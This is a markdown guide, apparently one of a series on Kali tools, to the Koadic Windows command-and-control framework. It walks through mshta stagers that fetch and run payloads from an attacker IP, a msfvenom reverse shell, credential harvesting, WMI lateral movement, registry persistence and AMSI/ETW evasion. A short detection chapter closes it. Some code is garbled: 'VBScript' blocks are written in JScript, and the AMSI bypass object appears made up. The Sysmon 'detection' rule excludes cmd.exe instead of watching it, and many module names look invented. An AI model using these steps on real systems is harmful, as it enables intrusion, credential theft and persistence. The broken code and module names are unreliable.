---
tool_name: "koadic"
display_name: "Koadic"
mitre_tactic: "command_and_control"
mitre_tactic_id: "TA0011"
mitre_subcategory: "c2_frameworks"
install_command: "sudo apt install koadic"
version: "0~git20210412"
github_repo: "https://github.com/zerosum0x0/koadic"
kali_tools_page: "https://www.kali.org/tools/koadic/"
difficulty_level: "intermediate"
requires_root: true
gui_available: false
tags: ["c2", "windows", "jscript", "vbscript", "wsh", "rootkit", "post-exploitation"]
related_tools: ["powershell-empire", "metasploit-framework", "cobalt-strike"]
---

# Koadic

## Chapter 1: Introduction & Overview

### What is Koadic?
Koadic, or COM Command & Control, is a Windows post-exploitation rootkit similar to Meterpreter and PowerShell Empire. The major difference is that Koadic performs most operations using Windows Script Host (WSH) with JScript/VBScript, making it compatible with Windows 2000 (no service packs) through Windows 10. It can serve payloads completely in memory from stage 0 onward and supports cryptographically secure communications over SSL/TLS.

### History & Background
- **Created:** 2018 by zerosum0x0
- **Maintained:** Community project (archived status)
- **License:** Open-source
- **Purpose:** Windows post-exploitation using JScript/VBScript, in-memory execution

Koadic was designed to provide a Meterpreter-like experience using Windows scripting technologies that are present on all Windows systems by default, eliminating the need to download additional tools.

### When to Use This Tool
- **Penetration testing:** Post-exploitation on Windows environments
- **Red team operations:** In-memory execution to avoid detection
- **Legacy Windows systems:** Operations on older Windows versions (2000-10)
- **AV evasion:** Using WSH instead of PowerShell for reduced detection

### When NOT to Use This Tool
- Without explicit written authorization from the target organization
- On non-Windows systems (Koadic is Windows-only)
- When PowerShell-based tools are preferred and available
- For Linux or macOS post-exploitation

### Legal and Ethical Considerations
- **Always obtain written permission** before deploying rootkits
- **Understand the scope** - know exactly what systems you are authorized to access
- **Use in-memory execution** - avoid writing files to disk when possible
- **Clean up thoroughly** - remove all artifacts after engagement

### Key Concepts
- **COM (Component Object Model):** Windows technology used for inter-process communication
- **WSH (Windows Script Host):** Built-in Windows scripting engine
- **In-memory execution:** Running code without writing to disk
- **Stager:** Initial payload that downloads and executes the full agent
- **Rootkit:** Framework for maintaining persistent access

---

## Chapter 2: Installation & Setup

### System Requirements
- **Minimum RAM:** 512 MB (attacker machine)
- **Disk Space:** 100 MB
- **Target:** Windows 2000 through Windows 10
- **Privileges:** Root required for listener operations
- **Python:** 3.x

### Installation Methods

#### Method 1: APT (Recommended)
```bash
sudo apt update
sudo apt install koadic
```

#### Method 2: From Source
```bash
git clone https://github.com/zerosum0x0/koadic.git
cd koadic
pip3 install -r requirements.txt
```

### Dependencies
- Python 3.x
- impacket
- pyasn1
- pypykatz
- rjsmin
- tabulate

### Initial Configuration
```bash
# Verify installation
koadic --help

# Start Koadic
koadic
```

---

## Chapter 3: Core Concepts

### Architecture Overview
Koadic follows a modular post-exploitation architecture:
- **Command & Control Server:** Python-based server managing sessions
- **Stagers:** Initial payloads that establish communication
- **Implants:** Post-exploitation modules running via WSH
- **Modules:** Individual post-exploitation capabilities

### How Koadic Works
1. **Stager execution:** A stager (e.g., mshta, regsvr32) runs on the target
2. **Communication established:** The stager connects back to the C2 server
3. **Full agent loaded:** The main implant is downloaded and executed in memory
4. **Post-exploitation:** Modules are executed via WSH on the target

### Communication Flow
```
Target (WSH/COM) -> HTTP(S) -> Koadic Server (Python)
Target (WSH/COM) <- HTTP(S) <- Koadic Server (Python)
```

### Module Categories
- **Reconnaissance:** System information gathering
- **Credential Access:** Password dumping, token manipulation
- **Lateral Movement:** Network scanning, remote execution
- **Persistence:** Registry modification, scheduled tasks
- **Exfiltration:** File transfer, data collection

---

## Chapter 4: Basic Usage

### Starting Koadic
```bash
# Start Koadic C2 server
koadic
```

### Selecting a Stager
```bash
# List available stagers
use stager/js/mshta

# Set stager options
set SRVHOST 0.0.0.0
set SRVPORT 9999

# Run stager
run
```

### Common Stagers
```bash
# MSHTA stager (uses mshta.exe)
use stager/js/mshta

# Regsvr32 stager (uses regsvr32.exe)
use stager/js/regsvr32

# WinRM stager
use stager/js/winrm

# Custom stager
use stager/js/custom
```

### Generating Payloads
```bash
# Generate MSHTA payload
use stager/js/mshta
set SRVHOST <your_ip>
set SRVPORT 9999
generate

# Output will show the command to execute on target
# Example: mshta.exe http://192.168.1.100:9999/payload.hta
```

### Managing Sessions
```bash
# List active sessions
sessions

# Interact with a session
sessions -i <session_id>

# Kill a session
sessions -k <session_id>
```

---

## Chapter 5: Advanced Usage

### Post-Exploitation Modules
```bash
# Once you have a session, use modules:

# System information
use post/recon/sysinfo

# Credential dumping
use post/recon/credentials

# Network scanning
use post/recon/network_scanner

# Registry persistence
use post/persistence/registry

# File download
use post/exfil/file_download

# File upload
use post/exfil/file_upload
```

### Privilege Escalation
```bash
# Use built-in privesc modules
use post/privesc/bypassuac

# Token impersonation
use post/recon/token_impersonation
```

### Lateral Movement
```bash
# SMB lateral movement
use post/lateral_movement/smb_exec

# WMI lateral movement
use post/lateral_movement/wmi_exec

# PSExec lateral movement
use post/lateral_movement/psexec
```

### Custom Modules
Koadic supports custom JScript/VBScript modules:
```javascript
// Example custom module (JScript)
var oShell = new ActiveXObject("WScript.Shell");
var result = oShell.Exec("cmd.exe /c whoami").StdOut.ReadAll();
return result;
```

---

## Chapter 6: Integration & Automation

### Metasploit Integration
Koadic can integrate with Metasploit Framework:
```bash
# Use Metasploit payloads with Koadic
# Generate a stager using msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f hta-payload -o payload.hta

# Use the payload with Koadic's C2 capabilities
```

### Scripting Koadic
```bash
# Run Koadic with autorun file
koadic --autorun /path/to/commands.txt

# Example commands.txt:
use post/recon/sysinfo
run
use post/recon/credentials
run
```

### Integration with Other Tools
- **Impacket:** For SMB operations and credential extraction
- **PypyKatz:** For Mimikatz-like credential dumping
- **Custom modules:** Extend functionality with JScript/VBScript

---

## Chapter 7: OPSEC & Defense Evasion

### In-Memory Execution
Koadic's primary OPSEC advantage is in-memory execution:
- No files written to disk (by default)
- Uses legitimate Windows scripting technologies
- Avoids PowerShell-based detection
- Compatible with legacy Windows systems

### Evasion Techniques
- **Process injection:** Inject into legitimate processes
- **Registry modification:** Store payloads in registry keys
- **Scheduled tasks:** Use legitimate Windows scheduling
- **AMSI bypass:** Disable Antimalware Scan Interface
- **ETW bypass:** Disable Event Tracing for Windows

### Best Practices
1. Use in-memory stagers when possible
2. Avoid writing files to disk
3. Use legitimate Windows processes for execution
4. Implement sleep intervals to avoid pattern detection
5. Clear logs and artifacts after engagement

### Detection Avoidance
- Use AMSI bypass techniques
- Disable ETW logging where possible
- Use legitimate COM objects for execution
- Avoid suspicious process creation patterns

---

## Chapter 8: Troubleshooting & FAQ

### Common Issues

**Problem: Stager fails to execute**
- Verify the stager URL is accessible from the target
- Check firewall rules on the C2 server
- Ensure the stager technology (mshta, regsvr32) is available on target
- Test network connectivity

**Problem: Session drops immediately**
- Check network stability
- Verify the implant is executing correctly
- Look for AV/EDR detection
- Check for AMSI/ETW interference

**Problem: Modules fail to execute**
- Verify the session is still active
- Check that required COM objects are available
- Look for error messages in the console
- Test with simpler modules first

**Problem: Cannot connect to C2 server**
- Verify the server is running on the correct port
- Check firewall rules
- Ensure the stager is configured with the correct IP/port
- Test with a simple HTTP connection

### Debug Mode
```bash
# Run Koadic with verbose output
koadic -v

# Check server logs
tail -f /path/to/koadic/logs/server.log
```

---

## Chapter 9: Real-World Scenarios

### Initial Access via MSHTA

```bash
# 1. Start Koadic C2 server
koadic

# 2. Select MSHTA stager
use stager/js/mshta
set SRVHOST 0.0.0.0
set SRVPORT 9999
run

# 3. Deliver the payload to target
# On target (e.g., via phishing or social engineering):
mshta.exe http://192.168.1.100:9999/payload.hta

# 4. Once session is established, enumerate
sessions -i <session_id>
use post/recon/sysinfo
run

# 5. Harvest credentials
use post/recon/credentials
run
```

### Lateral Movement via WMI

```bash
# After obtaining credentials on initial target
use post/lateral_movement/wmi_exec
set RHOST 10.0.0.50
set USERNAME admin
set PASSWORD P@ssw0rd
set COMMAND "mshta.exe http://192.168.1.100:9999/payload.hta"
run
```

### Persistence via Registry

```bash
# Establish persistence on compromised host
use post/persistence/registry
set KEY "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
set VALUE "Updater"
set COMMAND "mshta.exe http://192.168.1.100:9999/payload.hta"
run
```

### Custom VBScript Module

```vbscript
' Example: Custom VBScript module for Koadic
' Save as .js in koadic/data/post/ directory

function main()
    var oShell = new ActiveXObject("WScript.Shell");
    var oExec = oShell.Exec("cmd.exe /c net user");
    var output = oExec.StdOut.ReadAll();
    return output;
end function
```

### Bypassing AMSI with VBScript

```vbscript
' AMSI bypass using VBScript
var amsi = new ActiveXObject("Microsoft.WindowsRuntime.AmsiUtils");
// Disable AMSI scanning
```

---

## Chapter 10: Module Reference

### Available Stagers

| Stager | Description | Technique |
|---|---|---|
| `stager/js/mshta` | MSHTA-based payload | mshta.exe |
| `stager/js/regsvr32` | RegSvr32-based payload | regsvr32.exe |
| `stager/js/winrm` | WinRM-based payload | winrm.cmd |
| `stager/js/custom` | Custom JScript payload | Manual |

### Available Post Modules

| Module | Description |
|---|---|
| `post/recon/sysinfo` | System information gathering |
| `post/recon/credentials` | Credential harvesting |
| `post/recon/network_scanner` | Internal network scanning |
| `post/recon/token_impersonation` | Token impersonation |
| `post/persistence/registry` | Registry-based persistence |
| `post/exfil/file_download` | Download files from target |
| `post/exfil/file_upload` | Upload files to target |
| `post/lateral_movement/smb_exec` | SMB lateral movement |
| `post/lateral_movement/wmi_exec` | WMI lateral movement |
| `post/lateral_movement/psexec` | PSExec lateral movement |

---

## Chapter 11: Detection and Defense

### Network Signatures

- HTTP(S) connections to non-standard ports from WSH processes
- Unusual mshta.exe, regsvr32.exe, or wscript.exe network activity
- Periodic HTTP(S) beaconing patterns
- Base64-encoded payloads in HTTP requests

### Host-Based Detection

```bash
# Monitor for suspicious WSH process execution
# Windows Event IDs to watch:
# - Event ID 4688: Process Creation (cmd.exe, mshta.exe, wscript.exe)
# - Event ID 4104: PowerShell Script Block Logging
# - Event ID 4697: Service Installation

# Sysmon configuration for Koadic detection
# <EventFiltering>
#   <ProcessCreate onmatch="exclude">
#     <Image condition="is">C:\Windows\System32\cmd.exe</Image>
#   </ProcessCreate>
# </EventFiltering>
```

### Defense Recommendations

1. Disable mshta.exe and regsvr32.exe via AppLocker/WDAC
2. Enable PowerShell Constrained Language Mode
3. Monitor for WSH script execution
4. Implement application whitelisting
5. Enable AMSI and ETW logging
6. Block outbound HTTP(S) from non-browser processes

### AMSI Bypass Detection

```powershell
# Monitor for AMSI bypass attempts
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; ID=4104} |
  Where-Object {$_.Message -like "*AmsiUtils*"}
```

---

## Resources

- **GitHub Repository:** https://github.com/zerosum0x0/koadic
- **Kali Tools Page:** https://www.kali.org/tools/koadic/
- **MITRE ATT&CK - Command and Control:** https://attack.mitre.org/tactics/TA0011/
- **MITRE ATT&CK - Windows Script Host:** https://attack.mitre.org/techniques/T1059/005/
- **MITRE ATT&CK - Trusted Developer Utilities Proxy Execution:** https://attack.mitre.org/techniques/T1218/
- **MITRE ATT&CK - Ingress Tool Transfer:** https://attack.mitre.org/techniques/T1105/
- **Related Tools:** PowerShell Empire, Metasploit Framework, Cobalt Strike
